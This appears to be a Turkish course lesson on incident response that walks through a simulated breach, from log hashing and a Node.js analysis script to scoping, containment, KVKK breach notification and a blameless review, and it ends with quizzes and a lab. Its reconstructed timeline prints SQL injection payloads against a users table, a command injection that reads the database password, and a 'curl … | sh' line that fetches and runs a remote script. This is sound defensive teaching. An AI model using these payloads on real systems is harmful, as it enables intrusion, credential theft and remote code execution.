# Olay müdahalesi: tespit, kapsam, kontrol ve ders çıkarma

Bütün önlemlere rağmen bir gün bir olay yaşanacak. Bu dersin varsayımı bu. Olgun bir güvenlik programını olgun olmayandan ayıran, olayın **olmaması** değil, olayın **ne kadar hızlı fark edildiği, ne kadar doğru sınırlandığı ve aynı şeyin tekrar olmaması için ne yapıldığıdır**. Bu ders kursun bütün parçalarını bir olay senaryosu üzerinde birleştiriyor. Saldırganın kullandığı açıklar, birinci bölümde kendi ellerimizle istismar ettiklerimiz.

## Hazırlık: olay olmadan önce

Olay sırasında yapılamayacak her şey önceden yapılmış olmalıdır:

- **Loglar var, merkezi ve değiştirilemez.** Erişim logu, uygulama logu, kimlik sağlayıcısı, bulut denetim logu (CloudTrail), Kubernetes denetim logu, veritabanı denetimi. Saklama süresi en az birkaç ay olmalı. Ortalama bir sızıntının fark edilmesi aylar sürebiliyor. Loglar saldırganın ulaşabileceği hesapta durmamalı (altyapı dersi).
- **Saatler senkron (NTP) ve zaman damgaları UTC.** Farklı sistemlerin loglarını tek bir zaman çizelgesinde birleştirmenin ön koşulu budur.
- **Roller ve iletişim belli.** Olay yöneticisi kim, teknik lider kim, iletişimden kim sorumlu? Hukuk ve KVKK irtibat kişisine kim ulaşır? Saldırgan e-posta sistemini de ele geçirmiş olabilir, bu yüzden bant dışı bir iletişim kanalı hazır olmalı.
- **Oyun kitapları (runbook) yazılı ve denenmiş.** "Sızan anahtarı döndür", "pod'u yalıt", "kullanıcının bütün oturumlarını iptal et" gibi adımlar. Masa başı tatbikatları (tabletop) bu belgelerin eksiklerini olay öncesinde gösterir.
- **Tuzak değerler (honeytoken / canary).** Hiçbir meşru işin kullanmadığı sahte bir AWS anahtarı, `kullanicilar` tablosunda sahte bir kayıt ya da sahte bir `.env` dosyası. Bunlara herhangi bir erişim, neredeyse sıfır yanlış pozitifle "biri içeride" demektir.

## Senaryo

24 Kasım 2026 Pazartesi. 09:40 civarında uygulamanın 5xx hata oranında küçük bir sıçrama alarmı geliyor. Ardından veritabanı tarafında olağan dışı bir sorgu hacmi görülüyor. Elimizde uygulamanın JSON satır biçimindeki erişim logu var:

```text
{"zaman":"2026-11-24T08:00:00.000Z","ip":"203.0.113.41","yontem":"GET","yol":"/rapor?ad=srv-001","durum":200,"bayt":1123,"ua":"okhttp/4.12.0","sure_ms":35}
{"zaman":"2026-11-24T08:00:04.757Z","ip":"203.0.113.41","yontem":"GET","yol":"/","durum":200,"bayt":344,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","sure_ms":16}
...
```

Bu log, alıştırma için `olay-log-uret.mjs` ile tohumlu olarak üretildi. Aynı komut her seferinde aynı 3692 satırı üretir.

## 1. Delili koru

Analize başlamadan önce, elindeki kopyanın **sonradan değişmediğini** kanıtlayabilmelisin. Bu hem hukuki süreç hem de kendi analizinin güvenilirliği için gereklidir:

```bash
sha256sum erisim.log | tee erisim.log.sha256
sha256sum -c erisim.log.sha256
echo "x" >> erisim.log && sha256sum -c erisim.log.sha256    # bir satır eklenirse
```

```text
6697fefed115dff2175da2236dc6439bf32541cdd81ff0c1641fe3b425cb7b69 *erisim.log
erisim.log: OK
erisim.log: FAILED
sha256sum: WARNING: 1 computed checksum did NOT match
```

Delil toplamanın kuralları:

- **Önce topla, sonra müdahale et.** Ele geçirilmiş bir pod'u silmek, bellekteki zararlı süreci, ağ bağlantılarını ve geçici dosyaları da yok eder. Önce yalıt (NetworkPolicy ile trafiği kes, düğümü işaretle), sonra disk ve bellek görüntüsünü al, ardından kaldır.
- **Analiz kopyada yapılır.** Orijinal, salt okunur bir yerde ve özetiyle saklanır.
- **Bir kayıt tut.** Kim, ne zaman, hangi komutu çalıştırdı ve neyi değiştirdi? Bu kayıt, olay sonrası incelemenin de ham maddesidir.

## 2. Şüpheliyi bul

```js
// analiz.mjs — JSON satır logundan şüpheli IP'nin profili ve zaman çizelgesi
import fs from "node:fs";
import readline from "node:readline";

const [dosya, hedefIp] = process.argv.slice(2);
const ipler = new Map();
const cizelge = [];
const satirlar = readline.createInterface({ input: fs.createReadStream(dosya) });
for await (const s of satirlar) {
  const k = JSON.parse(s);
  const p = ipler.get(k.ip) ?? { istek: 0, hata: 0, bayt: 0, ua: new Set() };
  p.istek++; p.bayt += k.bayt; if (k.durum >= 400) p.hata++; p.ua.add(k.ua.split(" ")[0]);
  ipler.set(k.ip, p);
  if (k.ip === hedefIp) cizelge.push(k);
}

console.log("IP              istek  hata      bayt  istemciler");
for (const [ip, p] of [...ipler].sort((a, b) => b[1].bayt - a[1].bayt).slice(0, 4))
  console.log(`${ip.padEnd(15)} ${String(p.istek).padStart(5)} ${String(p.hata).padStart(5)} ${String(p.bayt).padStart(9)}  ${[...p.ua].join(", ")}`);

// Ardışık benzer istekleri tek satırda topla
console.log(`\n${hedefIp} zaman çizelgesi (UTC):`);
const ozet = (k) => decodeURIComponent(k.yol).replace(/OFFSET \d+/, "OFFSET n").slice(0, 78);
let onceki = null, adet = 0, ilk = null;
const yaz = () => onceki && console.log(`${ilk.zaman.slice(11, 19)}  ${String(ilk.durum)}  ${adet > 1 ? `x${adet}`.padEnd(4) : "    "} ${ozet(ilk)}`);
for (const k of cizelge) {
  const anahtar = /UNION .* kullanicilar/.test(ozet(k)) ? "veri-cekme" : k.yol;
  if (anahtar === onceki) { adet++; continue; }
  yaz(); onceki = anahtar; adet = 1; ilk = k;
}
yaz();
```

```bash
node analiz.mjs erisim.log 185.220.101.47
```

```text
IP              istek  hata      bayt  istemciler
185.220.101.47     54     9   1702177  Mozilla/5.0, sqlmap/1.9.2#stable, curl/8.11.1
203.0.113.40      651     0    482392  Mozilla/5.0, okhttp/4.12.0
198.51.100.10     626     0    469960  okhttp/4.12.0, Mozilla/5.0
198.51.100.23     604     0    461324  okhttp/4.12.0, Mozilla/5.0
```

Şüpheli kendini üç işaretle belli ediyor:

1. **Hacim oranı:** Diğer istemcilerin onda biri kadar istekle (54) üç buçuk katı veri (1,7 MB) çekmiş.
2. **Hata oranı:** Normal istemcilerin hiç hatası yokken bu istemcinin 54 isteğinin 9'u hata.
3. **İstemci kimliği:** `sqlmap` bir SQL enjeksiyonu aracıdır. Kullanıcı aracısı (User-Agent) kolayca değiştirilir, bu yüzden tek başına bir kanıt değildir. Ama değiştirilmemişse, değerli bir ipucudur.

Gerçek bir olayda ilk alarm çoğunlukla bu kadar net değildir. Saldırgan çok sayıda IP kullanabilir, isteklerini normal trafiğe yayabilir. Bu yüzden analiz IP'den değil, **davranıştan** başlar: olağan dışı sorgu kalıpları, tek istekte olağan dışı yanıt boyutu, normalde 404 almayan bir istemcinin 404 alması.

## 3. Zaman çizelgesini kur

```text
185.220.101.47 zaman çizelgesi (UTC):
09:12:00  404       /.env
09:12:00  404       /.git/config
09:12:01  404       /admin
09:12:02  404       /actuator/env
09:12:03  404       /wp-login.php
09:12:04  404       /backup.zip
09:12:05  404       /server-status
09:12:06  404       /api/debug
09:31:00  500       /sunucular?bolge=ist'
09:31:07  200       /sunucular?bolge=ist' OR '1'='1
09:31:14  200       /sunucular?bolge=x' UNION SELECT null,null,null--
09:31:21  200       /sunucular?bolge=x' UNION SELECT name,sql,type FROM sqlite_master--
09:33:00  200  x40  /sunucular?bolge=x' UNION SELECT eposta,parola_hash,rol FROM kullanicilar LIMI
09:47:00  200       /rapor?ad=srv-001 && node -p process.env.DB_PAROLA
09:48:00  200       /rapor?ad=srv-001 && curl -s http://185.220.101.47:8000/k.sh | sh
```

Bu çizelge, kursun birinci bölümünün kelimesi kelimesine bir tekrarıdır:

| Saat (UTC) | Aşama | Kursta karşılığı |
|---|---|---|
| 09:12 | **Keşif:** Bilinen hassas yolların taranması. Hepsi 404 | Sır dersi: `.env`, `.git/config` |
| 09:31:00 | **Açık tespiti:** Tek tırnak, `500` hatası | Enjeksiyon dersi: "hata mesajları saldırganın haritasıdır" |
| 09:31:07–21 | **Doğrulama ve şema keşfi:** `OR 1=1`, sütun sayısı, `sqlite_master` | Enjeksiyon dersi: UNION ve katalog |
| 09:33–09:41 | **Veri çekme:** `kullanicilar` tablosu, 500'lük 40 sayfa | Enjeksiyon dersi |
| 09:47 | **Komut enjeksiyonu:** Uygulamanın ortamındaki veritabanı parolası okunuyor | Enjeksiyon dersi: `exec` ve ortam değişkenindeki sır |
| 09:48 | **Kalıcılık / ikinci aşama:** Saldırganın sunucusundan bir betik indirilip çalıştırılıyor | Altyapı dersi: yazılabilir dosya sistemi, çıkış trafiği |

İki ayrıntıya dikkat. Birincisi, son isteğin süresi 2210 ms. Sunucu dışarıya bir bağlantı açıp bir betik indirdi. İkincisi, alarm (09:40) gerçek başlangıçtan (09:12) 28 dakika sonra geldi. Keşif aşaması hiçbir alarm üretmedi, ama 8 hızlı 404 başlı başına bir işaretti.

## 4. Kapsamı belirle

"Ne oldu?" sorusundan daha zoru "**ne olmadı?**" sorusudur. Bu soru, hangi verinin ve sistemin etkilendiğini belirler. Olay bildirimleri de buna dayanır:

- **Veri:** `LIMIT 500 OFFSET n` sorgusu 40 kez çalıştı, son OFFSET 19500. En fazla **20.000 kullanıcı kaydı** (e-posta, parola hash'i, rol) çekilmiş olabilir. Yanıt boyutları (her biri yaklaşık 41–44 KB) bu sayıyla tutarlı. Kesin rakam için veritabanı denetim logu ve tablonun o anki satır sayısı kullanılır.
- **Sırlar:** Veritabanı parolası (`DB_PAROLA`) sızdı. Uygulamanın ortamındaki diğer bütün değişkenler de sızmış kabul edilir. Komutla yalnızca biri basıldı, ama saldırgan kod çalıştırabiliyordu.
- **Sistem:** 09:48'de uygulama konteynerinde saldırganın betiği çalıştı. Bu noktadan sonra konteyner, onun eriştiği her şey ve servis hesabı jetonu ele geçirilmiş sayılır. Konteynerden nereye kadar gidilebildiğini altyapı dersi belirliyor: Pod Security, NetworkPolicy, metadata erişimi.
- **Yanal hareket:** Bu konteynerin ağdan ulaşabildiği servislerin ve sızan parolayla giriş yapılabilen veritabanının logları, 09:47'den itibaren incelenir.

## 5. Kontrol altına al, temizle, geri dön

Sıralama önemlidir. Saldırganı uyarıp davranışını değiştirmesine yol açmadan önce, kapsamın yeterince anlaşılmış olması istenir. Ama aktif veri sızıntısı sürüyorsa **önce durdurulur**.

1. **Kısa vadeli kontrol:**
   - IP'yi WAF ya da ingress seviyesinde engelle. Bu bir hız kesicidir, çözüm değildir, çünkü saldırgan IP değiştirir.
   - Ele geçirilen pod'u NetworkPolicy ile yalıt ve delilini al.
   - Açıklı uç noktaları bir özellik bayrağıyla kapat ya da WAF kuralıyla sınırla.
2. **Sırları döndür:**
   - Veritabanı parolasını, ortamdaki her sırrı ve servis hesabı jetonunu değiştir.
   - Dinamik sırlar (sır dersi) burada büyük fark yaratır: Kısa ömürlü kimlik bilgisi zaten kendiliğinden geçersiz olur.
3. **Kullanıcıları koru:**
   - Parola hash'leri sızdı. argon2id ile saklandıysa çevrimdışı kırma pahalıdır ama imkânsız değildir. Zayıf parolalar zamanla bulunur (kimlik dersi).
   - Etkilenen kullanıcıların oturumlarını iptal et ve parola değişikliğini zorunlu kıl.
   - Credential stuffing'e karşı giriş izlemesini sıkılaştır.
4. **Kökü düzelt:** Bind değişkenleri, `execFile` ve girdi doğrulama (enjeksiyon dersi). Düzeltmenin testleri (test dersi) aynı MR'da yazılır.
5. **Temiz yeniden kurulum:** Ele geçirilmiş konteyner "temizlenmez", **yeniden oluşturulur**. İmaj, doğrulanmış bir kaynaktan ve imzasıyla dağıtılır (tedarik zinciri dersi). Salt okunur kök dosya sistemi, saldırganın kalıcılığını zaten zorlaştırırdı.
6. **İzle:** Saldırganın geri dönüş girişimleri için kalıplar, tuzak değerler ve bilinen IP'ler bir süre yakından izlenir.

## 6. Bildirim

Kişisel veri ihlallerinde KVKK'nın gereklilikleri (sır dersi):

- **Kurula bildirim:** Kurul kararına göre ihlal öğrenildikten sonra **72 saat** içinde, Kurulun ihlal bildirim formuyla yapılır. Bilgilerin tamamı bu sürede toplanamadıysa, eldeki bilgiyle bildirilir ve sonradan tamamlanır. Gecikmenin gerekçesi de bildirilir.
- **İlgili kişilere bildirim:** Makul en kısa sürede, kişinin kendisini koruyabilmesi için gereken bilgilerle yapılır: hangi veri, ne zaman, ne yapmalı (parola değiştirme, oltalama uyarısı).
- **Sözleşmesel bildirimler:** Müşteri sözleşmeleri, bulut sağlayıcısı, sigorta ve ödeme kartı verisi varsa PCI DSS kapsamındaki bildirim yükümlülükleri.

Zamanlayıcı **öğrenme anında** başlar, kapsamın tamamen anlaşıldığı anda değil. Olay kaydının ilk satırına "ne zaman öğrenildi" bilgisinin yazılmasının nedeni budur.

## 7. Ders çıkarma: suçlamasız olay sonrası inceleme

Olay kapandıktan sonra, kısa bir süre içinde (1–2 hafta) yazılı bir inceleme yapılır. Amaç kişiyi değil, **sistemi** düzeltmektir. "Mehmet bind değişkeni kullanmadı" bir kök neden değildir. Asıl kök neden sorusu şudur: Sistem, bir geliştiricinin bind değişkenini unutmasına **neden izin verdi** ve bu durum neden 28 dakika fark edilmedi? Bu senaryo için:

| Soru | Bulgu | Eylem (sahibi, tarihi) |
|---|---|---|
| Açık neden koda girdi? | SQL şablon dizgesiyle kuruluyor. Kod incelemesi ve SAST bunu yakalamadı | Semgrep özel kuralı, MR'da engelleyici (test dersi) |
| Neden istismar edilebildi? | Ham veritabanı hatası istemciye dönüyordu. Uygulama kullanıcısının `kullanicilar` tablosuna okuma yetkisi vardı | Genel hata mesajı. Uygulama hesabı için en az yetki, kullanıcı verisi ayrı bir hizmette |
| Neden kod çalıştırılabildi? | `exec` ve kabuk. Sırlar ortam değişkeninde | `execFile`, sırlar dosyada |
| Neden dışarıdan betik indirilebildi? | Pod'un sınırsız çıkış trafiği vardı. Kök dosya sistemi yazılabilirdi | Varsayılan reddeden NetworkPolicy ve çıkış vekili. `readOnlyRootFilesystem` |
| Neden 28 dakika fark edilmedi? | 404 taraması ve `sqlmap` kullanıcı aracısı için alarm yoktu. Alarm sadece 5xx oranındaydı | WAF/log kuralları: hassas yol taraması, bilinen araç imzaları, istek başına olağan dışı yanıt boyutu. Tuzak tablo kaydı |
| Etkiyi ne sınırladı? | argon2id ile saklanan parolalar | Korunacak iyi uygulama olarak kayda geçer |

İyi bir incelemenin çıktısı, sahibi ve tarihi olan eylemlerdir. Bu eylemler takip edilir ve kapatılır. Ayrıca neyin **iyi işlediği** de yazılır. Bu olayda argon2id, sızan hash'lerin kırılmasını pahalı hale getirdi. Bu bulgu, "parola saklama yatırımı işe yaradı" demektir.

## Kursun sonu

Bu senaryodaki her adım, kursun bir dersine karşılık geliyordu. Bunun nedeni gerçek olayların da böyle olmasıdır. Tek bir büyük hata nadirdir. Olay, her biri tek başına "küçük" görünen birkaç zayıflığın **zincirlenmesiyle** oluşur. Derinlemesine savunmanın değeri de buradan gelir: Zincirin herhangi bir halkasındaki bir önlem, olayın sonucunu değiştirirdi.

- Bind değişkeni olsaydı veri çekilemezdi.
- Hata mesajı genel olsaydı keşif yavaşlardı.
- `execFile` kullanılsaydı kod çalıştırılamazdı.
- Sır dosyada olsaydı `process.env` dökümü boş dönerdi.
- Çıkış trafiği kapalı olsaydı betik indirilemezdi.
- Tarama alarmı olsaydı olay 09:12'de fark edilirdi.

```quiz
{
  "question": "Ele geçirildiğinden şüphelenilen bir pod tespit edildi. Bir mühendis 'hemen silelim, Deployment yenisini açar' diyor. Doğru sıra hangisi?",
  "options": [
    "Hemen silmek doğrudur. Ne kadar erken silinirse o kadar iyi.",
    "Önce pod'u yalıt (NetworkPolicy ile trafiği kes, düğümü cordon et), sonra delil topla (disk ve bellek, süreç listesi, ağ bağlantıları, loglar ve özetleri), sırları döndür, ardından pod'u kaldır ve doğrulanmış imajdan yeniden kur. Kök neden düzeltilmeden açılan yeni pod da aynı açıkla ele geçirilir.",
    "Pod'u yeniden başlatmak yeterlidir.",
    "Hiçbir şey yapmadan izlemeye devam etmek gerekir."
  ],
  "answer": 1,
  "explanation": "Silmek bellekteki ve geçici diskteki delili yok eder. Kök neden kapatılmadıysa, yeni pod da aynı yolla ele geçirilir. Yalıt, topla, döndür, düzelt, yeniden kur sırası izlenir."
}
```

```quiz
{
  "question": "Bir olay pazartesi 10:00'da fark ediliyor. Ekip kapsamı çarşamba 16:00'da netleştirebiliyor, kişisel verinin sızdığı da o zaman kesinleşiyor. KVKK açısından doğru yaklaşım hangisi?",
  "options": [
    "72 saat çarşamba 16:00'da başlar, çünkü ihlal o zaman kesinleşti.",
    "Süre ihlalin öğrenilmesiyle başlar. Ekip ilk günden olay kaydını tutmalı, hukuk ve KVKK irtibat kişisini erken dahil etmeli, eldeki bilgiyle süresinde bildirim yapıp bilgiyi sonradan tamamlamalıdır.",
    "Veri şifreliyse hiçbir durumda bildirim gerekmez.",
    "Sadece etkilenen kişilere bildirim yeterlidir."
  ],
  "answer": 1,
  "explanation": "Bildirim yükümlülüğünün zamanlaması öğrenme anına bağlıdır. Kesin yorum hukuk biriminindir. Mühendislik açısından bu, olay kaydının ilk dakikadan tutulması ve kapsam belirleme çalışmasının bildirimi beklemeden paralel yürümesi demektir."
}
```

```lab
{
  "title": "Masa başı tatbikatı",
  "steps": [
    "olay-log-uret.mjs ve analiz.mjs ile senaryoyu kendin üret. Ardından üreticiyi değiştir: Saldırgan her istekte farklı bir IP kullansın (örneğin 185.220.101.0/24 içinden) ve kullanıcı aracısı normal bir tarayıcı olsun. Analizi IP yerine davranışa göre (yanıt boyutu, SQL anahtar kelimeleri, 404 oranı) yeniden yaz.",
    "Bu senaryo için üç tespit kuralı yaz: kısa sürede 5'ten fazla hassas yola 404, sorgu parametresinde SQL anahtar kelimesi ve tırnak, ortalamanın 20 katından büyük yanıt. Her kuralın normal trafikte ne kadar yanlış pozitif ürettiğini ölç.",
    "Uygulamanın veritabanına bir tuzak kullanıcı kaydı ekle (gerçek olmayan, benzersiz bir e-posta). Bu e-postanın uygulama loglarında ya da giden e-postalarda görünmesini bir alarm koşulu olarak tanımla.",
    "Ekibinle 45 dakikalık bir masa başı tatbikatı yap: Bu dersteki senaryoyu adım adım oku ve her adımda 'şu an kim, ne yapıyor, hangi araca erişiyor?' diye sor. Cevapsız kalan her soruyu bir oyun kitabı maddesine çevir.",
    "Bu senaryo için suçlamasız bir olay sonrası inceleme belgesi yaz: zaman çizelgesi, etki, kök nedenler (sistem seviyesinde), işe yarayanlar ve sahibi ile tarihi olan eylemler."
  ]
}
```

## Özet

- Hazırlık olaydan önce yapılır: merkezi ve değiştirilemez loglar, UTC ve NTP, roller, bant dışı iletişim, denenmiş oyun kitapları, tuzak değerler.
- Önce delili koru: özetle, kopyada analiz et, kayıt tut. Ele geçirilen sistemi önce yalıt, delili al, sonra kaldır.
- Analiz davranıştan başlar: hacim ve hata oranı, olağan dışı yanıt boyutları, araç imzaları. Zaman çizelgesi saldırının aşamalarını (keşif, doğrulama, veri çekme, kod çalıştırma, kalıcılık) ortaya koyar.
- Kapsam, "ne olmadı?" sorusunun cevabıdır: hangi veri, hangi sırlar, hangi sistemler, nereye kadar yanal hareket.
- Kontrol ve temizlik: kısa vadeli engelleme, bütün sırların döndürülmesi, oturum iptali, kökün testleriyle düzeltilmesi, doğrulanmış imajdan yeniden kurulum, izleme.
- KVKK: Süre öğrenmeyle başlar. Kurula 72 saat içinde bildirim, ilgili kişilere makul en kısa sürede bildirim, eksik bilgi sonradan tamamlanır.
- Suçlamasız inceleme, sistemi düzeltir: sahibi ve tarihi olan eylemler, ayrıca işe yarayan önlemlerin kaydı.
